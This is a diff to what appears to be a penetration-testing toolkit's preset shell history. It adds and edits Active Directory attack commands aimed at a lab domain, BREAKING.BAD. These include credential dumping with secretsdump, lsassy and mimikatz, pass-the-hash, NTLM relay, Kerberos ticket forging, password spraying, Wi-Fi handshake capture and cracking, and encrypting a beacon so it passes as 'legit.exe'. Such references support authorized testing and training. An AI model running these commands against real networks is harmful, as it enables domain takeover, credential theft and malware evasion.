@@ -5,11 +5,13 @@ responder-http-on
 responder-smb-off
 responder-smb-on
 bloodhound.py -c All -d breaking.bad -u anonymous -p anonymous -dc DC01.BREAKING.BAD
-dig -t SRV _ldap._tcp.BREAKING.BAD
-dig -t SRV _kerberos._tcp.BREAKING.BAD
-dig -t SRV _gc._tcp.BREAKING.BAD
-dig -t SRV _kpasswd._tcp.BREAKING.BAD
-dig -t SRV _ldap._tcp.dc._msdcs.BREAKING.BAD
+bloodhound.py -c All -d breaking.bad -u anonymous --hashes 'ffffffffffffffffffffffffffffffff':'a88baa3fdc8f581ee0fb05d7054d43e4' -dc DC01.BREAKING.BAD
+nslookup _ldap._tcp.dc._msdcs.BREAKING.BAD
+nslookup -type=srv _kerberos._tcp.BREAKING.BAD
+nslookup -type=srv _gc._tcp.BREAKING.BAD
+nslookup -type=srv _kpasswd._tcp.BREAKING.BAD
+nslookup -type=srv _ldap._tcp.BREAKING.BAD
+nslookup -type=srv _ldap._tcp.dc._msdcs.BREAKING.BAD
 nbtscan -r 192.168.56.0/24
 nmap --script dns-srv-enum --script-args dns-srv-enum.domain=BREAKING.BAD
 mount -t cifs //192.168.56.201/C\$ /tmp/mnttarget/ -o username=anonymous -o domain=BREAKING.BAD
@@ -22,7 +24,9 @@ ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer
 ntlmrelayx -t ldap://DC01.BREAKING.BAD -smb2support --escalate-user SHUTDOWN
 getST.py -spn host/DC02.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 BREAKING.BAD/'SHUTDOWN$':123soleil
 getST.py -spn host/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 BREAKING.BAD/'SHUTDOWN$':123soleil
-secretsdump -k DC02.BREAKING.BAD
+secretsdump -sam sam.save -system system.save -security security.save LOCAL
+secretsdump -k -outputfile BREAKING.BAD DC02.BREAKING.BAD
+secretsdump -outputfile BREAKING.BAD -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
 secretsdump -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
 rpcclient -U '' -N DC01.BREAKING.BAD
 rpcclient -U BREAKING/anonymous 192.168.56.101
@@ -40,20 +44,23 @@ proxychains psexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains atexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains wmiexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains dcomexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
+proxychains lsassy -d BREAKING.BAD -u Administrator -p 'p@ssword' SV01.BREAKING.BAD
 psexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 smbexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 wmiexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 atexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 dcomexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 dcomexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
+cme smb 192.168.56.101 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M enum_avproducts
+cme smb 192.168.56.101 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M mimikatz
 cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy
 cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=exegol4thewin
 crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy
 crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=exegol4thewin
-sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous -p 'azerty'
-sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous
-lsassy -v -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 192.168.56.0/24
-lsassy -v -d BREAKING.BAD -u Administrator -p 'passw0rd' 192.168.56.0/24
+sprayhound -d 'BREAKING.BAD' -dc 'DC01.BREAKING.BAD' -nu 'neo4j' -np 'exegol4thewin' -lu 'anonymous' -lp 'anonymous' -p 'azerty'
+sprayhound -d 'BREAKING.BAD' -dc 'DC01.BREAKING.BAD' -nu 'neo4j' -np 'exegol4thewin' -lu 'anonymous' -lp 'anonymous'
+lsassy -v -u 'Administrator' -H a88baa3fdc8f581ee0fb05d7054d43e4 192.168.56.0/24
+lsassy -v -d 'BREAKING.BAD' -u 'Administrator' -p 'passw0rd' 192.168.56.0/24
 export KRB5CCNAME=Administrator.ccache
 lsassy -d BREAKING.BAD -u Administrator -k SV01.BREAKING.BAD
 masscan -v -p 1-65535 --rate=10000 -e eth0 192.168.56.0/24
@@ -129,9 +136,11 @@ getST.py -spn CIFS/SV01@BREAKING.BAD -impersonate Administrator -dc-ip 192.168.5
 getST.py -spn RPCSS/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 'BREAKING.BAD/SHUTDOWN$:123soleil'
 secretsdump -just-dc-user krbtgt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 'BREAKING.BAD/Administrator@dc01.breaking.bad'
 lookupsid.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 'BREAKING.BAD/Administrator@dc01.breaking.bad' 0
-ticketer.py -nthash 123456789krbtgtnthash123456789 -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain BREAKING.BAD randomuser
+ticketer.py -nthash 0123456789krbtgtnthash0123456789 -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain BREAKING.BAD randomuser
+ticketer.py -nthash 0123456789krbtgtnthash0123456789 -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain BREAKING.BAD -spn HOST/SV01.BREAKING.BAD randomuser
 export KRB5CCNAME=randomuser.ccache
-hashcat -m 1000 --potfile-path ntds.cracked ntds.tocrack --show --username --outfile-format 3
+secretsdump -k SV01.BREAKING.BAD
+hashcat -m 1000 --potfile-path BREAKING.BAD.ntds.cracked BREAKING.BAD.ntds --show --username --outfile-format 3
 cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt
 cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt --kdcHost 192.168.56.101
 cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt
@@ -191,4 +200,24 @@ nmap -sS -n --open -p 88 192.168.56.0/24
 windapsearch --dc 192.168.56.101 --module metadata
 windapsearch --dc 192.168.56.101 --module users
 nmap --script broadcast-dhcp-discover
-SimplyEmail.py -all -e cybersyndicates.com 
+SimplyEmail -all -e cybersyndicates.com 
+ssh-keygen -t rsa -b 4096 -f keyname
+hashcat --username -m 0 -a 0 hashes.txt `fzf-wordlists`
+rbcd-permissions -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=SV01,OU=Computers,DC=DOMAIN,DC=LOCAL' -d BREAKING.BAD -u anonymous -p anonymous -l DC01.BREAKING.BAD
+rbcd-permissions --cleanup -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=SV01,OU=Computers,DC=DOMAIN,DC=LOCAL' -d BREAKING.BAD -u anonymous -p anonymous -l DC01.BREAKING.BAD
+rbcd-permissions -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=SV01,OU=Computers,DC=DOMAIN,DC=LOCAL' -d BREAKING.BAD -k -l DC01.BREAKING.BAD
+xfreerdp /d:BREAKING.BAD /u:someuser /pth:c1c635aa12ae60b7fe39e28456a7bac6 /v:SV01.BREAKING.BAD
+darkarmour -f /data/beacon.exe --encrypt xor --jmp --loop 7 -o /data/legit.exe
+amber -f beacon.exe
+hashcat -m 1000 BREAKING.BAD.ntds --show --username
+hashcat -m 1000 BREAKING.BAD.ntds --show
+hashcat -m 1000 BREAKING.BAD.ntds --show --username `fzf-wordlists`
+hcxdumptool -I
+hcxdumptool -i wlan1 -o dump.pcapng --active_beacon --enable_status=1
+hcxpcapngtool -o dump.hashcat dump.pcapng
+hcxhashtool -i dump.hashcat --info stdout
+hashcat -m 16800 dump.hashcat `fzf-wordlists`
+hcxpcapngtool --all -o dump.hashcat dump.pcapng
+hashcat -m 22000 dump.hashcat `fzf-wordlists`
+responder --interface eth0 --analyze --lm
+ntlmv1-multi --ntlmv1 SV01$::BREAKING.BAD:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:1122334455667788
